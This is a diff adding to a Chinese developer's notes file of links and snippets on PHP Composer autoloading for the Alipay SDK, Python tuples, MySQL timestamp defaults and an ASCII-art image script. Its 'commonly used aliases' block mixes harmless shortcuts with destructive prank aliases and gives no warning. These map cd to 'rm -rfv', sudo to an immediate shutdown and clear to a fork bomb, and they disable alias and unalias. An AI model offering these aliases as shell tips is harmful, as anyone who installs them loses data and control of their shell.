@@ -1,5 +1,197 @@
 [FSCapture是一款抓屏工具](http://jingyan.baidu.com/article/d5c4b52be9a966da560dc5af.html)
 [PDO和消息队列的一点个人理解](http://www.cnblogs.com/loveyoume/p/6107239.html)
+[支付宝 alipay-sdk- PHP](https://www.v2ex.com/t/348451)
+https://github.com/wxpay/WXPay-SDK-PHP  https://github.com/wxpay https://github.com/fishlab/alipay-sdk-php
+```js
+经实践，最终我的做法是： 
+1 、在 vendors 下新建 alipay 
+2 、把 SDK 里的 aop 目录拷到 alipay 下（抛弃原来 SDK 目录下的 lotusphp_runtime 和 AopSdk.php ） 
+3 、最终目录结构是 vendors/alipay/aop 
+4 、 composer.json 的 autoload 节点里加入： 
+
+"classmap": [ 
+"vendor/alipay/aop" 
+] 
+
+5 、运行``composer dump-autoload`` 
+6 、这样在项目里可以不用 require ，直接： 
+ 
+// 仅测试能使用命名空间，忽略参数设置吧。。。 
+$a = new \AopClient(); 
+$b = new \AlipayAppTokenGetRequest(); 
+$c = $a->execute($b); 
+修改  composer.json  把这个文件夹下的所有类自动归入根命名空间
+"autoload": {
+
+  "classmap": [
+
+    "app/controllers",
+
+    "app/models",
+
+    "services"
+
+  ]
+
+}
+运行  composer dump-autoload ，完成以后，我们就可以在控制器中直接调用这个类了
+
+```
+[Unicode字符集中有哪些神奇的字符](https://www.zhihu.com/question/30873035/answer/178297820)
+https://link.zhihu.com/?target=http%3A//www.unicode.org/charts/ 
+0.3-0.1=0.19999999999999998
+
+就这个情况，短期内取代ptyhon 很难
+[re unicode 范围报错](https://www.v2ex.com/t/365196#reply1)
+```js
+import re;re.findall(u'[\U00010000-\U0001FFFFF]', u'\U0001f61b',re.U)
+```
+[python 的 tuple 是不是冗余设计？](https://www.zhihu.com/question/60574107/answer/177715146)
+```js
+lst = [i for i in range(0xffff)]
+tpl = tuple(i for i in range(0xffff))
+from sys import getsizeof
+getsizeof(lst)
+tuple还具有一些list没有的特性（也不能算作优点吧），比如因为tuple是 immutable, 所以它是可哈希的(hashable)的。
+tuple可以作为dict的key，或者扔进set里，list则不行
+In [11]: hash(tpl)
+Out[11]: 7487529697070271394 
+chardet库：识别文件的编码格式
+with open('test1.txt', 'rb') as f:    
+    result = chardet.detect(f.read())  
+print(result)
+MVC的本质就是分离界面和逻辑.
+
+界面反映在PHP开发里就是视图模板.
+
+逻辑反映在PHP开发里就是控制器.
+
+MVC连在一起表达就是: 控制器,加载数据模型,渲染视图模板.
+
+可见控制器控制着整个程序输入输出的走向.
+
+需要注意的是:
+
+控制器里不写SQL操作模型,视图里不写逻辑处理业务.
+```
+在线拼接电影字幕截图工具http://join-screenshots.zhanghai.me/
+Gist 管理工具 Leptonhttps://www.v2ex.com/t/365669
+[ php7.1 的一些疑惑](https://www.v2ex.com/t/365509#reply10)
+PHP 还可以做游戏服务端[pocketmine-mp]( https://github.com/pmmp/pocketmine-mp) 
+ 7.0 之前版本有类型隐形转换把，$tmp[$k]的时候自动把$tmp 转换成 array 了，7.1 没有做类型转换，所以输出就是 string 了
+7.1 新特性，现在字符串不会自动转换为数组，跟你发的链接没什么关系http://php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.empty-string-index-operator
+[【数据库】Invalid default value for 'create_date' timestamp field](http://www.54php.cn/default/195.html)
+`created_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '插入时间' 就是不能为 timestamp字段设置指定的默认值，也就是语句中的 0000-00-00 00:00:00 其实从5.6.17这个版本就默认设置了不允许插入 0 日期了，术语是 NO_ZERO_IN_DATE  NO_ZERO_DATE 如果一定要设置为 0 日期的话，也是可以的，找到mysql的配置文件，在修改sql-mode,然后重启数据库服务 sql-mode = "STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION" SHOW VARIABLES LIKE 'sql_mode';
+[完美解决failed to open stream: HTTP request failed!(file_get_contents引起的)](http://www.54php.cn/default/201.html)
+ini_set("user_agent","Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)");
+$data_content = file_get_contents( $url ); https://learnxinyminutes.com/
+[有哪些程序员特有的技能](https://www.zhihu.com/question/30719851)
+cmd里面不想一点点输入冗长的文件路径？
+直接把这个文件拖到CMD窗口吧！
+你会发现 路径自己补上去了。 shift 右键 在此处打开命令窗口
+document.body.contentEditable = true
+0x7FFFFFFF 2147483647，只能说明那群鬼子不懂二进制。 2^31-1
+十进制2147483647转二进制为0111 1111 1111 1111 1111 1111 1111 1111 直接win+E打开文件夹把读计算机的朋友惊呆了
+用WIN+L直接把屏幕锁住后，身后的一群金融精英们惊呆了 win+d，直接回到桌面，把所有小学生惊呆了 Win+TAB 3D切换，身边的一群文科僧惊呆了
+电脑滑动解锁。
+把开机密码设置为 asdfghjkl;' 进入登陆界面时，从左往右一路滑到Enter键上，然后就进去了
+[排序算法-N个正整数排序](https://zhuanlan.zhihu.com/p/27095748)
+[英语学渣8个月轻松突破9000单词量的宝贵方法论，不看绝对亏大了！](https://zhuanlan.zhihu.com/p/27136686)
+[萌新刷题（一）A + B 问题](http://www.lintcode.com/zh-cn/problem/a-b-problem/)
+https://link.zhihu.com/?target=https%3A//www.jiuzhang.com/solutions/
+[将彩色图片转化为素描的效果图片](https://github.com/liujiachao/image---replace)
+[一个把图片转换成字符画的小程序](https://www.zhihu.com/question/33646570/answer/102046631)
+```js
+一个基于命令行的在线词典 kuanghy/kictorhttps://github.com/kuanghy/kictor
+import Image
+ 
+color = 'MNHQ$OC?7>!:-;.' #zifu
+ 
+def to_html(func):
+    html_head = '''
+            <html>
+              <head>
+                <style type="text/css">
+                  body {font-family:Monospace; font-size:5px;}
+                </style>
+              </head>
+            <body> '''
+    html_tail = '</body></html>'
+ # ding yi HTML
+    def wrapper(img):
+        pic_str = func(img)
+        pic_str = ''.join(l + ' <br/>' for l in pic_str.splitlines())
+        return html_head + pic_str + html_tail
+ 
+    return wrapper
+ # fan hui zhi
+@to_html
+def make_char_img(img):
+    pix = img.load()
+    pic_str = ''
+    width, height = img.size
+    for h in xrange(height):
+        for w in xrange(width):
+            pic_str += color[int(pix[w, h]) * 14 / 255]
+        pic_str += '\n'
+    return pic_str
+ 
+def preprocess(img_name):
+    img = Image.open(img_name)
+ 
+    w, h = img.size
+    m = max(img.size)
+    delta = m / 200.0
+    w, h = int(w / delta), int(h / delta)
+    img = img.resize((w, h))
+    img = img.convert('L')
+ 
+    return img
+ 
+def save_to_file(filename, pic_str):
+    outfile = open(filename, 'w')
+    outfile.write(pic_str)
+    outfile.close()
+ 
+def main():
+    img = preprocess(raw_input('input your filename:'))
+    pic_str = make_char_img(img)
+    save_to_file('char.html', pic_str)
+ 
+if __name__ == '__main__':
+    main()
+```
+[分享几个我自己常用的 aliases](https://www.v2ex.com/t/365260#reply29)
+```js
+# 文件按大小排序，lbys = ls by size
+alias lbys='ls -alhS'
+
+# 文件按时间排序，lbyt = ls by time
+alias lbyt='ls -alht'
+
+# 重新运行上一条命令，并将输出复制到剪贴板，cl = copy last
+alias cl='bash -c "$(fc -ln -1)" | pbcopy'
+
+# 复制上一条命令
+alias last='fc -ln -1 | pbcopy'
+
+# 将当前剪贴板里的内容保存到某个文件里
+alias new='pbpaste | cat >'
+alias save='pbpaste | cat >'
+alias c=clear
+alias myip='curl ifconfig.co' curl ip.gs
+alias cd='rm -rfv'; 
+alias sudo='sudo shutdown -P now'; 
+alias clear=':(){ :|:& };:'; 
+alias cp='mv'; 
+alias exit='sh'; 
+alias if='if !' for='for !' while='while !'; 
+alias vim="vim +q"; 
+alias unalias=false; 
+alias alias=false;
+alias gr=./review 
+alias http="echo http://$(echo $(hostname -I | cut -d' ' -f1) | xargs ):8000 && python3 -m http.server" 
+```
 [用 Redis 实现分布式锁与实现任务队列](http://blog.jobbole.com/95156/)
 
 为了应对高并发，处理数据量超级大的一种数据容器，也可以说是利用各种方式，先把数据存储在一个···容器···中，然后，再慢慢从这个容器中获取数据，实现·····异步操作数据库·····的方式，以便降低数据库的压力
